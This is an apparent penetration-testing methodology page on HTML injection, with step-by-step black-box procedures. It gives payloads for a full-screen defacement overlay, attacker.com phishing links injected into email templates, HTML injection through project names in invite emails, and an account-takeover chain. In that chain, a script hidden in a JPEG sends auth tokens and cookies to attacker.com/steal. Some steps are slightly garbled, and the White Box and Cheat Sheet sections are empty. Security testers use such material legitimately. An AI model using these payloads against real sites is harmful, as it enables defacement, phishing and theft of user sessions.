# HTML Injection

## Check List

## Methodology

### Black Box

#### Stored

{% stepper %}
{% step %}
Go to any page that has a user-editable rich text field ticket or description, comment, bio
{% endstep %}

{% step %}
Enter normal text like `test <b>bold</b>` test and submit
{% endstep %}

{% step %}
View the saved content with another user or in private mode, if bold renders as bold text, limited HTML is allowed
{% endstep %}

{% step %}
Intercept the save/create request with Burp Suite and send to Repeater
{% endstep %}

{% step %}
In the parameter that contains the user input and replace the value with this breakout + overlay payload

```html
"><div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,1);z-index:2147483647;"></div>
```
{% endstep %}

{% step %}
If ظthe input is already inside a tag wrapped in \<p> use this version

```html
</p><div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,1);z-index:2147483647;"></div><p>
```
{% endstep %}

{% step %}
Send the request and let the content be saved
{% endstep %}

{% step %}
Log in as a different user or open incognito/private window and visit any page that displays the saved content dashboard, ticket list, profile page, forum thread,&#x20;
{% endstep %}

{% step %}
If the entire screen becomes completely black and nothing is clickable Full visual defacement via Stored HTML Injection with style attribute is confirmed
{% endstep %}

{% step %}
Works on every platform that uses whitelist-based HTML Sanitization and allows the `<style>` attribute on `<div>, <h1>, <b>, <i>, <a>,`&#x20;
{% endstep %}
{% endstepper %}

***

#### **Email HTML Injection** <a href="#bb11" id="bb11"></a>

{% stepper %}
{% step %}
Go to any property valuation, booking request, or contact form that sends user input to an email template
{% endstep %}

{% step %}
Fill the form normally (especially the address or street, city field and intercept the POST request with Burp Suite
{% endstep %}

{% step %}
Send the request to Repeater
{% endstep %}

{% step %}
In the JSON body, locate the address-related fields commonly `street`, `formattedAddress`, address, location, city
{% endstep %}

{% step %}
Replace the street or `formattedAddress` value with your attacker-controlled URL For Example

```json
"street": "https://attacker.com",
"formattedAddress": "https://attacker.com"
```
{% endstep %}

{% step %}
Full example payload works on any similar endpoint

```json
{
  "address": {
    "street": "https://attacker.com",
    "formattedAddress": "https://attacker.com",
    "city": "Click here for your free valuation",
    "postalCode": "https://attacker.com"
  },
  "email": "victim@company.com",
  "name": "Please click the link below"
}
```
{% endstep %}

{% step %}
Send the request – it will succeed (no 403 if the field is not validated)
{% endstep %}

{% step %}
Wait for the confirmation or booking email to be sent to the `admin/agent/staff`
{% endstep %}

{% step %}
When the victim (employee) opens the email, the address field will be rendered as a clickable link pointing to `https://attacker.com`
{% endstep %}

{% step %}
If the victim clicks it Successful Email Template Content Spoofing Phishing via Trusted Domain confirmed
{% endstep %}
{% endstepper %}

***

#### Email Invite Manipulation

{% stepper %}
{% step %}
Log in to your account on `target.com`
{% endstep %}

{% step %}
Navigate to your project settings page
{% endstep %}

{% step %}
Change your **project name** to a payload such as

```html
<img src="https://miro.app.com/v2/resize:fit:720/format:webp/0*y2OAF_DSarBAjihO.jpg">
```
{% endstep %}

{% step %}
Go to the Invite Members section and send an email invitation to any email address you control
{% endstep %}

{% step %}
Open the received email
{% endstep %}

{% step %}
You will notice that the HTML image is rendered **inline in the email body**, proving successful injection
{% endstep %}
{% endstepper %}

***

#### Account Takeover

{% stepper %}
{% step %}
Go to your profile/shop bio or any field that allows limited HTML&#x20;
{% endstep %}

{% step %}
Enter this exact HTML structure and save it

```html
<div class="remote-pagination-container">
<div class="pagination">
<a href="/cloudinary/images/your_image_id?options[delivery_type]=upload">Next page →</a>
</div>
</div>
```
{% endstep %}

{% step %}
Upload any valid image to the site (via avatar, product image, shop banner anywhere that uses `Cloudinary`
{% endstep %}

{% step %}
After upload, grab the image ID from the final URL usually looks like `s--AbCdEfGh--`/v1234567890/image\_name.jpg → your\_image\_id = `s--AbCdEfGh--`)
{% endstep %}

{% step %}
Replace `your_image_id` in the href above with your real Cloudinary image ID
{% endstep %}

{% step %}
Use a hex editor (https://hexed.it or local tool) to open your original image file
{% endstep %}

{% step %}
Go to offset `0x1A` (or any safe location after JPEG headers) and insert your XSS payload exactly like this

```html
<script>fetch('https://attacker.com/steal?token='+localStorage.getItem('auth_token')+'&cookie='+document.cookie)</script>Save the modified image as new file (still valid JPEG)
```
{% endstep %}

{% step %}
Save the modified image as new file (still valid JPEG)
{% endstep %}

{% step %}
Update your bio HTML with the new image ID and exact parameter`options[delivery_type]=upload`
{% endstep %}

{% step %}
Final working bio payload

```html
<div class="remote-pagination-container">
<div class="pagination">
<a href="/cloudinary/images/s--NewMaliciousID--/?options[delivery_type]=upload">Next →</a>
</div>
</div>
```
{% endstep %}

{% step %}
Save the bio and Now go to any victim's shop page or wait for anyone to view your shop/profile
{% endstep %}

{% step %}
When they click the "Next page →" link → `jQuery replaceWith()` loads your raw image bytes via same-origin → your embedded executes → localStorage token + cookies stolen → Account Takeover achieved
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
